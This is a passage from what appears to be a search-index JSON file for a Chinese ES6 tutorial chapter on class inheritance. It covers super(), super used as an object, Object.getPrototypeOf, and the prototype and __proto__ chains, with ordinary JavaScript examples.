<p>\u8fd9\u662f\u56e0\u4e3a\u5b50\u7c7b\u81ea\u5df1\u7684<code>this</code>\u5bf9\u8c61\uff0c\u5fc5\u987b\u5148\u901a\u8fc7\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u5b8c\u6210\u5851\u9020\uff0c\u5f97\u5230\u4e0e\u7236\u7c7b\u540c\u6837\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u7136\u540e\u518d\u5bf9\u5176\u8fdb\u884c\u52a0\u5de5\uff0c\u52a0\u4e0a\u5b50\u7c7b\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u5982\u679c\u4e0d\u8c03\u7528<code>super</code>\u65b9\u6cd5\uff0c\u5b50\u7c7b\u5c31\u5f97\u4e0d\u5230<code>this</code>\u5bf9\u8c61\u3002</p> <pre><code>class Point { /* ... */ }\n\nclass ColorPoint extends Point {\n  constructor() {\n  }\n}\n\nlet cp = new ColorPoint(); // ReferenceError\n// fix: super();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>ColorPoint</code>\u7ee7\u627f\u4e86\u7236\u7c7b<code>Point</code>\uff0c\u4f46\u662f\u5b83\u7684\u6784\u9020\u51fd\u6570\u6ca1\u6709\u8c03\u7528<code>super</code>\u65b9\u6cd5\uff0c\u5bfc\u81f4\u65b0\u5efa\u5b9e\u4f8b\u65f6\u62a5\u9519\u3002</p> <p>ES5 \u7684\u7ee7\u627f\uff0c\u5b9e\u8d28\u662f\u5148\u521b\u9020\u5b50\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61<code>this</code>\uff0c\u7136\u540e\u518d\u5c06\u7236\u7c7b\u7684\u65b9\u6cd5\u6dfb\u52a0\u5230<code>this</code>\u4e0a\u9762\uff08<code>Parent.apply(this)</code>\uff09\u3002ES6 \u7684\u7ee7\u627f\u673a\u5236\u5b8c\u5168\u4e0d\u540c\uff0c\u5b9e\u8d28\u662f\u5148\u5c06\u7236\u7c7b\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u52a0\u5230<code>this</code>\u4e0a\u9762\uff08\u6240\u4ee5\u5fc5\u987b\u5148\u8c03\u7528<code>super</code>\u65b9\u6cd5\uff09\uff0c\u7136\u540e\u518d\u7528\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4fee\u6539<code>this</code>\u3002</p> <p>\u5982\u679c\u5b50\u7c7b\u6ca1\u6709\u5b9a\u4e49<code>constructor</code>\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u88ab\u9ed8\u8ba4\u6dfb\u52a0\uff0c\u4ee3\u7801\u5982\u4e0b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u7ba1\u6709\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\uff0c\u4efb\u4f55\u4e00\u4e2a\u5b50\u7c7b\u90fd\u6709<code>constructor</code>\u65b9\u6cd5\u3002</p> <pre><code>class ColorPoint extends Point {\n}\n\n// \u7b49\u540c\u4e8e\nclass ColorPoint extends Point {\n  constructor(...args) {\n    super(...args);\n  }\n}\n</code></pre> <p>\u53e6\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u662f\uff0c\u5728\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e2d\uff0c\u53ea\u6709\u8c03\u7528<code>super</code>\u4e4b\u540e\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528<code>this</code>\u5173\u952e\u5b57\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u8fd9\u662f\u56e0\u4e3a\u5b50\u7c7b\u5b9e\u4f8b\u7684\u6784\u5efa\uff0c\u57fa\u4e8e\u7236\u7c7b\u5b9e\u4f8b\uff0c\u53ea\u6709<code>super</code>\u65b9\u6cd5\u624d\u80fd\u8c03\u7528\u7236\u7c7b\u5b9e\u4f8b\u3002</p> <pre><code>class Point {\n  constructor(x, y) {\n    this.x = x;\n    this.y = y;\n  }\n}\n\nclass ColorPoint extends Point {\n  constructor(x, y, color) {\n    this.color = color; // ReferenceError\n    super(x, y);\n    this.color = color; // \u6b63\u786e\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b\u7684<code>constructor</code>\u65b9\u6cd5\u6ca1\u6709\u8c03\u7528<code>super</code>\u4e4b\u524d\uff0c\u5c31\u4f7f\u7528<code>this</code>\u5173\u952e\u5b57\uff0c\u7ed3\u679c\u62a5\u9519\uff0c\u800c\u653e\u5728<code>super</code>\u65b9\u6cd5\u4e4b\u540e\u5c31\u662f\u6b63\u786e\u7684\u3002</p> <p>\u4e0b\u9762\u662f\u751f\u6210\u5b50\u7c7b\u5b9e\u4f8b\u7684\u4ee3\u7801\u3002</p> <pre><code>let cp = new ColorPoint(25, 8, 'green');\n\ncp instanceof ColorPoint // true\ncp instanceof Point // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61<code>cp</code>\u540c\u65f6\u662f<code>ColorPoint</code>\u548c<code>Point</code>\u4e24\u4e2a\u7c7b\u7684\u5b9e\u4f8b\uff0c\u8fd9\u4e0e ES5 \u7684\u884c\u4e3a\u5b8c\u5168\u4e00\u81f4\u3002</p> <p>\u6700\u540e\uff0c\u7236\u7c7b\u7684\u9759\u6001\u65b9\u6cd5\uff0c\u4e5f\u4f1a\u88ab\u5b50\u7c7b\u7ee7\u627f\u3002\u5f53\u7136\uff0c\u8fd9\u91cc\u4e5f\u662f\u5b50\u7c7b\u7684\u9759\u6001\u65b9\u6cd5\uff0c\u4e0d\u662f\u5b50\u7c7b\u7684\u5b9e\u4f8b\u65b9\u6cd5\u3002</p> <pre><code>class A {\n  static hello() {\n    console.log('hello world');\n  }\n}\n\nclass B extends A {\n}\n\nB.hello()  // hello world\n</code></pre>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#objectgetprototypeof","title":"Object.getPrototypeOf()","text":"<p><code>Object.getPrototypeOf</code>\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u4ece\u5b50\u7c7b\u4e0a\u83b7\u53d6\u7236\u7c7b\u3002</p> <pre><code>Object.getPrototypeOf(ColorPoint) === Point\n// true\n</code></pre> <p>\u56e0\u6b64\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u5224\u65ad\uff0c\u4e00\u4e2a\u7c7b\u662f\u5426\u7ee7\u627f\u4e86\u53e6\u4e00\u4e2a\u7c7b\u3002</p>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#super","title":"super \u5173\u952e\u5b57","text":"<p><code>super</code>\u8fd9\u4e2a\u5173\u952e\u5b57\uff0c\u65e2\u53ef\u4ee5\u5f53\u4f5c\u51fd\u6570\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u5bf9\u8c61\u4f7f\u7528\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u7684\u7528\u6cd5\u5b8c\u5168\u4e0d\u540c\u3002</p> <p>\u7b2c\u4e00\u79cd\u60c5\u51b5==\uff0c<code>super</code>\u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u4ee3\u8868\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570==\u3002ES6 \u8981\u6c42\uff0c\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u5fc5\u987b\u6267\u884c\u4e00\u6b21<code>super</code>\u51fd\u6570\u3002</p> <pre><code>class A {}\n\nclass B extends A {\n  constructor() {\n    super();\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b<code>B</code>\u7684\u6784\u9020\u51fd\u6570\u4e4b\u4e2d\u7684<code>super()</code>\uff0c\u4ee3\u8868\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3002\u8fd9\u662f\u5fc5\u987b\u7684\uff0c\u5426\u5219 JavaScript \u5f15\u64ce\u4f1a\u62a5\u9519\u3002</p> <p>\u6ce8\u610f\uff0c<code>super</code>\u867d\u7136\u4ee3\u8868\u4e86\u7236\u7c7b<code>A</code>\u7684\u6784\u9020\u51fd\u6570\uff0c\u4f46\u662f\u8fd4\u56de\u7684\u662f\u5b50\u7c7b<code>B</code>\u7684\u5b9e\u4f8b\uff0c\u5373<code>super</code>\u5185\u90e8\u7684<code>this</code>\u6307\u7684\u662f<code>B</code>\u7684\u5b9e\u4f8b\uff0c\u56e0\u6b64<code>super()</code>\u5728\u8fd9\u91cc\u76f8\u5f53\u4e8e<code>A.prototype.constructor.call(this)</code>\u3002</p> <pre><code>class A {\n  constructor() {\n    console.log(new.target.name);\n  }\n}\nclass B extends A {\n  constructor() {\n    super();\n  }\n}\nnew A() // A\nnew B() // B\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>new.target</code>\u6307\u5411\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u51fd\u6570\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u5728<code>super()</code>\u6267\u884c\u65f6\uff0c\u5b83\u6307\u5411\u7684\u662f\u5b50\u7c7b<code>B</code>\u7684\u6784\u9020\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u7236\u7c7b<code>A</code>\u7684\u6784\u9020\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>super()</code>\u5185\u90e8\u7684<code>this</code>\u6307\u5411\u7684\u662f<code>B</code>\u3002</p> <p>\u4f5c\u4e3a\u51fd\u6570\u65f6\uff0c<code>super()</code>\u53ea\u80fd\u7528\u5728\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e4b\u4e2d\uff0c\u7528\u5728\u5176\u4ed6\u5730\u65b9\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>class A {}\n\nclass B extends A {\n  m() {\n    super(); // \u62a5\u9519\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>super()</code>\u7528\u5728<code>B</code>\u7c7b\u7684<code>m</code>\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u5c31\u4f1a\u9020\u6210\u8bed\u6cd5\u9519\u8bef\u3002</p> <p>\u7b2c\u4e8c\u79cd\u60c5\u51b5==\uff0c<code>super</code>\u4f5c\u4e3a\u5bf9\u8c61\u65f6\uff0c\u5728\u666e\u901a\u65b9\u6cd5\u4e2d\uff0c\u6307\u5411\u7236\u7c7b\u7684\u539f\u578b\u5bf9\u8c61\uff1b\u5728\u9759\u6001\u65b9\u6cd5\u4e2d\uff0c\u6307\u5411\u7236\u7c7b==\u3002</p> <pre><code>class A {\n  p() {\n    return 2;\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super(); // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff1a\u4f5c\u4e3a\u51fd\u6570\u6267\u884c\uff0c\u4ee3\u8868\u7236\u7c7bA\u7684\u6784\u9020\u51fd\u6570\n    console.log(super.p()); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff1a\u4f5c\u4e3a\u5bf9\u8c61\uff0c\u8c03\u7528super\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u8c03\u7528\u6784\u9020\u51fd\u6570\u7684\u65b9\u6cd5\n  }\n}\n\nlet b = new B();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b<code>B</code>\u5f53\u4e2d\u7684<code>super.p()</code>\uff0c\u5c31\u662f\u5c06<code>super</code>\u5f53\u4f5c\u4e00\u4e2a\u5bf9\u8c61\u4f7f\u7528\u3002\u8fd9\u65f6\uff0c<code>super</code>\u5728\u666e\u901a\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u6307\u5411<code>A.prototype</code>\uff0c\u6240\u4ee5<code>super.p()</code>\u5c31\u76f8\u5f53\u4e8e<code>A.prototype.p()</code>\u3002</p> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0c\u7531\u4e8e<code>super</code>\u6307\u5411\u7236\u7c7b\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u6240\u4ee5\u5b9a\u4e49\u5728\u7236\u7c7b\u5b9e\u4f8b\u4e0a\u7684\u65b9\u6cd5\u6216\u5c5e\u6027\uff0c\u662f\u65e0\u6cd5\u901a\u8fc7<code>super</code>\u8c03\u7528\u7684\u3002</p> <pre><code>class A {\n  constructor() {\n    this.p = 2;\n  }\n}\n\nclass B extends A {\n  get m() {\n    return super.p;\n  }\n}\n\nlet b = new B();\nb.m // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>p</code>\u662f\u7236\u7c7b<code>A</code>\u5b9e\u4f8b\u7684\u5c5e\u6027\uff0c<code>super.p</code>\u5c31\u5f15\u7528\u4e0d\u5230\u5b83\u3002\u6240\u4ee5\uff0c\u4e0d\u80fd\u7528\u8fc7super\u76f4\u63a5\u8c03\u7528\u7236\u7c7b\u7684\u5b9e\u4f8b\u5c5e\u6027\uff08constructor\u5185\u90e8\u7684\u5c5e\u6027\uff09\uff0c\u53ea\u80fd\u83b7\u53d6\u7236\u7c7b\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <p>\u5982\u679c\u5c5e\u6027\u5b9a\u4e49\u5728\u7236\u7c7b\u7684\u539f\u578b\u5bf9\u8c61\u4e0a\uff0c<code>super</code>\u5c31\u53ef\u4ee5\u53d6\u5230\u3002</p> <pre><code>class A {}\nA.prototype.x = 2;\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super.x) // 2\n  }\n}\n\nlet b = new B();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c5e\u6027<code>x</code>\u662f\u5b9a\u4e49\u5728<code>A.prototype</code>\u4e0a\u9762\u7684\uff0c\u6240\u4ee5<code>super.x</code>\u53ef\u4ee5\u53d6\u5230\u5b83\u7684\u503c\u3002</p> <p>ES6 \u89c4\u5b9a\uff0c\u5728==\u5b50\u7c7b\u666e\u901a\u65b9\u6cd5\u4e2d\u901a\u8fc7<code>super</code>\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u65f6==\uff0c\u65b9\u6cd5\u5185\u90e8\u7684<code>this</code>\u6307\u5411\u5f53\u524d\u7684\u5b50\u7c7b\u5b9e\u4f8b\u3002</p> <pre><code>class A {\n  constructor() {\n    this.x = 1;\n  }\n  print() {\n    console.log(this.x);\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    this.x = 2;\n  }\n  m() {\n    super.print();\n  }\n}\n\nlet b = new B();\nb.m() // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>super.print()</code>\u867d\u7136\u8c03\u7528\u7684\u662f<code>A.prototype.print()</code>\uff0c\u4f46\u662f<code>A.prototype.print()</code>\u5185\u90e8\u7684<code>this</code>\u6307\u5411\u5b50\u7c7b<code>B</code>\u7684\u5b9e\u4f8b\uff0c\u5bfc\u81f4\u8f93\u51fa\u7684\u662f<code>2</code>\uff0c\u800c\u4e0d\u662f<code>1</code>\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b9e\u9645\u4e0a\u6267\u884c\u7684\u662f<code>super.print.call(this)</code>\u3002</p> <p>\u7531\u4e8e<code>this</code>\u6307\u5411\u5b50\u7c7b\u5b9e\u4f8b\uff0c\u6240\u4ee5\u5982\u679c\u901a\u8fc7<code>super</code>\u5bf9\u67d0\u4e2a\u5c5e\u6027\u8d4b\u503c\uff0c\u8fd9\u65f6<code>super</code>\u5c31\u662f<code>this</code>\uff0c\u8d4b\u503c\u7684\u5c5e\u6027\u4f1a\u53d8\u6210\u5b50\u7c7b\u5b9e\u4f8b\u7684\u5c5e\u6027\u3002</p> <pre><code>class A {\n  constructor() {\n    this.x = 1;\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    this.x = 2;\n    super.x = 3;\n    console.log(super.x); // undefined\n    console.log(this.x); // 3\n  }\n}\n\nlet b = new B();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>super.x</code>\u8d4b\u503c\u4e3a<code>3</code>\uff0c\u8fd9\u65f6\u7b49\u540c\u4e8e\u5bf9<code>this.x</code>\u8d4b\u503c\u4e3a<code>3</code>\u3002\u800c\u5f53\u8bfb\u53d6<code>super.x</code>\u7684\u65f6\u5019\uff0c\u8bfb\u7684\u662f<code>A.prototype.x</code>\uff0c\u6240\u4ee5\u8fd4\u56de<code>undefined</code>\u3002</p> <p>\u5982\u679c<code>super</code>\u4f5c\u4e3a\u5bf9\u8c61\uff0c\u7528\u5728\u9759\u6001\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u8fd9\u65f6<code>super</code>\u5c06\u6307\u5411\u7236\u7c7b\uff0c\u800c\u4e0d\u662f\u7236\u7c7b\u7684\u539f\u578b\u5bf9\u8c61\u3002</p> <pre><code>class Parent {\n  static myMethod(msg) {\n    console.log('static', msg);\n  }\n\n  myMethod(msg) {\n    console.log('instance', msg);\n  }\n}\n\nclass Child extends Parent {\n  static myMethod(msg) {\n    super.myMethod(msg);\n  }\n\n  myMethod(msg) {\n    super.myMethod(msg);\n  }\n}\n\nChild.myMethod(1); // static 1\n\nvar child = new Child();\nchild.myMethod(2); // instance 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>super</code>\u5728\u9759\u6001\u65b9\u6cd5\u4e4b\u4e2d\u6307\u5411\u7236\u7c7b\uff0c\u5728\u666e\u901a\u65b9\u6cd5\u4e4b\u4e2d\u6307\u5411\u7236\u7c7b\u7684\u539f\u578b\u5bf9\u8c61\u3002</p> <p>\u53e6\u5916\uff0c\u5728\u5b50\u7c7b\u7684\u9759\u6001\u65b9\u6cd5\u4e2d\u901a\u8fc7<code>super</code>\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u65f6\uff0c\u65b9\u6cd5\u5185\u90e8\u7684<code>this</code>\u6307\u5411\u5f53\u524d\u7684\u5b50\u7c7b\uff0c\u800c\u4e0d\u662f\u5b50\u7c7b\u7684\u5b9e\u4f8b\u3002</p> <pre><code>class A {\n  constructor() {\n    this.x = 1;\n  }\n  static print() {\n    console.log(this.x);\n  }\n}\n\nclass B extends A {\n  constructor() {\n    super();\n    this.x = 2;\n  }\n  static m() {\n    super.print();\n  }\n}\n\nB.x = 3;\nB.m() // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9759\u6001\u65b9\u6cd5<code>B.m</code>\u91cc\u9762\uff0c<code>super.print</code>\u6307\u5411\u7236\u7c7b\u7684\u9759\u6001\u65b9\u6cd5\u3002\u8fd9\u4e2a\u65b9\u6cd5\u91cc\u9762\u7684<code>this</code>\u6307\u5411\u7684\u662f<code>B</code>\uff0c\u800c\u4e0d\u662f<code>B</code>\u7684\u5b9e\u4f8b\u3002</p> <p>\u6ce8\u610f\uff0c\u4f7f\u7528<code>super</code>\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u663e\u5f0f\u6307\u5b9a\u662f\u4f5c\u4e3a\u51fd\u6570\u3001\u8fd8\u662f\u4f5c\u4e3a\u5bf9\u8c61\u4f7f\u7528\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>class A {}\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super); // \u62a5\u9519\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>console.log(super)</code>\u5f53\u4e2d\u7684<code>super</code>\uff0c\u65e0\u6cd5\u770b\u51fa\u662f\u4f5c\u4e3a\u51fd\u6570\u4f7f\u7528\uff0c\u8fd8\u662f\u4f5c\u4e3a\u5bf9\u8c61\u4f7f\u7528\uff0c\u6240\u4ee5 JavaScript \u5f15\u64ce\u89e3\u6790\u4ee3\u7801\u7684\u65f6\u5019\u5c31\u4f1a\u62a5\u9519\u3002\u8fd9\u65f6\uff0c\u5982\u679c\u80fd\u6e05\u6670\u5730\u8868\u660e<code>super</code>\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u3002</p> <pre><code>class A {}\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super.valueOf() instanceof B); // true\n  }\n}\n\nlet b = new B();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>super.valueOf()</code>\u8868\u660e<code>super</code>\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56e0\u6b64\u5c31\u4e0d\u4f1a\u62a5\u9519\u3002\u540c\u65f6\uff0c\u7531\u4e8e<code>super</code>\u4f7f\u5f97<code>this</code>\u6307\u5411<code>B</code>\u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5<code>super.valueOf()</code>\u8fd4\u56de\u7684\u662f\u4e00\u4e2a<code>B</code>\u7684\u5b9e\u4f8b\u3002</p> <p>\u6700\u540e\uff0c\u7531\u4e8e\u5bf9\u8c61\u603b\u662f\u7ee7\u627f\u5176\u4ed6\u5bf9\u8c61\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u4efb\u610f\u4e00\u4e2a\u5bf9\u8c61\u4e2d\uff0c\u4f7f\u7528<code>super</code>\u5173\u952e\u5b57\u3002</p> <pre><code>var obj = {\n  toString() {\n    return \"MyObject: \" + super.toString();\n  }\n};\n\nobj.toString(); // MyObject: [object Object]\n</code></pre>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#prototype-__proto__","title":"\u7c7b\u7684 prototype \u5c5e\u6027\u548c__proto__\u5c5e\u6027","text":"<p>\u5927\u591a\u6570\u6d4f\u89c8\u5668\u7684 ES5 \u5b9e\u73b0\u4e4b\u4e2d\uff0c\u6bcf\u4e00\u4e2a\u5bf9\u8c61\u90fd\u6709<code>__proto__</code>\u5c5e\u6027\uff0c\u6307\u5411\u5bf9\u5e94\u7684\u6784\u9020\u51fd\u6570\u7684<code>prototype</code>\u5c5e\u6027\u3002Class \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u7684\u8bed\u6cd5\u7cd6\uff0c\u540c\u65f6\u6709<code>prototype</code>\u5c5e\u6027\u548c<code>__proto__</code>\u5c5e\u6027\uff0c\u56e0\u6b64\u540c\u65f6\u5b58\u5728\u4e24\u6761\u7ee7\u627f\u94fe\u3002</p> <p>\uff081\uff09\u5b50\u7c7b\u7684<code>__proto__</code>\u5c5e\u6027\uff0c\u8868\u793a==\u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f==\uff0c\u603b\u662f\u6307\u5411\u7236\u7c7b\u3002</p> <p>\uff082\uff09\u5b50\u7c7b<code>prototype</code>\u5c5e\u6027\u7684<code>__proto__</code>\u5c5e\u6027\uff0c\u8868\u793a==\u65b9\u6cd5\u7684\u7ee7\u627f==\uff0c\u603b\u662f\u6307\u5411\u7236\u7c7b\u7684<code>prototype</code>\u5c5e\u6027\u3002</p> <pre><code>class A {\n}\n\nclass B extends A {\n}\n\nB.__proto__ === A // true\nB.prototype.__proto__ === A.prototype // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b<code>B</code>\u7684<code>__proto__</code>\u5c5e\u6027\u6307\u5411\u7236\u7c7b<code>A</code>\uff0c\u5b50\u7c7b<code>B</code>\u7684<code>prototype</code>\u5c5e\u6027\u7684<code>__proto__</code>\u5c5e\u6027\u6307\u5411\u7236\u7c7b<code>A</code>\u7684<code>prototype</code>\u5c5e\u6027\u3002</p> <p>\u8fd9\u6837\u7684\u7ed3\u679c\u662f\u56e0\u4e3a\uff0c\u7c7b\u7684\u7ee7\u627f\u662f\u6309\u7167\u4e0b\u9762\u7684\u6a21\u5f0f\u5b9e\u73b0\u7684\u3002</p> <pre><code>class A {\n}\n\nclass B {\n}\n\n// B \u7684\u5b9e\u4f8b\u7ee7\u627f A \u7684\u5b9e\u4f8b\nObject.setPrototypeOf(B.prototype, A.prototype);\n\n// B \u7ee7\u627f A \u7684\u9759\u6001\u5c5e\u6027\nObject.setPrototypeOf(B, A);\n\nconst b = new B();\n</code></pre> <p>\u300a\u5bf9\u8c61\u7684\u6269\u5c55\u300b\u4e00\u7ae0\u7ed9\u51fa\u8fc7<code>Object.setPrototypeOf</code>\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002</p> <pre><code>Object.setPrototypeOf = function (obj, proto) {\n  obj.__proto__ = proto;\n  return obj;\n}\n</code></pre> <p>\u56e0\u6b64\uff0c\u5c31\u5f97\u5230\u4e86\u4e0a\u9762\u7684\u7ed3\u679c\u3002</p> <pre><code>Object.setPrototypeOf(B.prototype, A.prototype);\n// \u7b49\u540c\u4e8e\nB.prototype.__proto__ = A.prototype;\n\nObject.setPrototypeOf(B, A);\n// \u7b49\u540c\u4e8e\nB.__proto__ = A;\n</code></pre> <p>\u8fd9\u4e24\u6761\u7ee7\u627f\u94fe\uff0c\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u4f5c\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b50\u7c7b\uff08<code>B</code>\uff09\u7684\u539f\u578b\uff08<code>__proto__</code>\u5c5e\u6027\uff09\u662f\u7236\u7c7b\uff08<code>A</code>\uff09\uff1b\u4f5c\u4e3a\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5b50\u7c7b\uff08<code>B</code>\uff09\u7684\u539f\u578b\u5bf9\u8c61\uff08<code>prototype</code>\u5c5e\u6027\uff09\u662f\u7236\u7c7b\u7684\u539f\u578b\u5bf9\u8c61\uff08<code>prototype</code>\u5c5e\u6027\uff09\u7684\u5b9e\u4f8b\u3002</p> <pre><code>B.prototype = Object.create(A.prototype);\n// \u7b49\u540c\u4e8e\nB.prototype.__proto__ = A.prototype;\n</code></pre> <p><code>extends</code>\u5173\u952e\u5b57\u540e\u9762\u53ef\u4ee5\u8ddf\u591a\u79cd\u7c7b\u578b\u7684\u503c\u3002</p> <pre><code>class B extends A {\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>A</code>\uff0c\u53ea\u8981\u662f\u4e00\u4e2a\u6709<code>prototype</code>\u5c5e\u6027\u7684\u51fd\u6570\uff0c\u5c31\u80fd\u88ab<code>B</code>\u7ee7\u627f\u3002\u7531\u4e8e\u51fd\u6570\u90fd\u6709<code>prototype</code>\u5c5e\u6027\uff08\u9664\u4e86<code>Function.prototype</code>\u51fd\u6570\uff09\uff0c\u56e0\u6b64<code>A</code>\u53ef\u4ee5\u662f\u4efb\u610f\u51fd\u6570\u3002</p> <p>\u4e0b\u9762\uff0c\u8ba8\u8bba\u4e24\u79cd\u60c5\u51b5\u3002\u7b2c\u4e00\u79cd\uff0c\u5b50\u7c7b\u7ee7\u627f<code>Object</code>\u7c7b\u3002</p> <pre><code>class A extends Object {\n}\n\nA.__proto__ === Object // true\nA.prototype.__proto__ === Object.prototype // true\n</code></pre> <p>\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c<code>A</code>\u5176\u5b9e\u5c31\u662f\u6784\u9020\u51fd\u6570<code>Object</code>\u7684\u590d\u5236\uff0c<code>A</code>\u7684\u5b9e\u4f8b\u5c31\u662f<code>Object</code>\u7684\u5b9e\u4f8b\u3002</p> <p>\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u4e0d\u5b58\u5728\u4efb\u4f55\u7ee7\u627f\u3002</p> <pre><code>class A {\n}\n\nA.__proto__ === Function.prototype // true\nA.prototype.__proto__ === Object.prototype // true\n</code></pre> <p>\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c<code>A</code>\u4f5c\u4e3a\u4e00\u4e2a\u57fa\u7c7b\uff08\u5373\u4e0d\u5b58\u5728\u4efb\u4f55\u7ee7\u627f\uff09\uff0c\u5c31\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u6240\u4ee5\u76f4\u63a5\u7ee7\u627f<code>Function.prototype</code>\u3002\u4f46\u662f\uff0c<code>A</code>\u8c03\u7528\u540e\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff08\u5373<code>Object</code>\u5b9e\u4f8b\uff09\uff0c\u6240\u4ee5<code>A.prototype.__proto__</code>\u6307\u5411\u6784\u9020\u51fd\u6570\uff08<code>Object</code>\uff09\u7684<code>prototype</code>\u5c5e\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#proto","title":"\u5b9e\u4f8b\u7684 proto \u5c5e\u6027","text":"<p>\u5b50\u7c7b\u5b9e\u4f8b\u7684<code>__proto__</code>\u5c5e\u6027\u7684<code>__proto__</code>\u5c5e\u6027\uff0c\u6307\u5411\u7236\u7c7b\u5b9e\u4f8b\u7684<code>__proto__</code>\u5c5e\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b50\u7c7b\u7684\u539f\u578b\u7684\u539f\u578b\uff0c\u662f\u7236\u7c7b\u7684\u539f\u578b\u3002</p> <pre><code>var p1 = new Point(2, 3);\nvar p2 = new ColorPoint(2, 3, 'red');\n\np2.__proto__ === p1.__proto__ // false\np2.__proto__.__proto__ === p1.__proto__ // 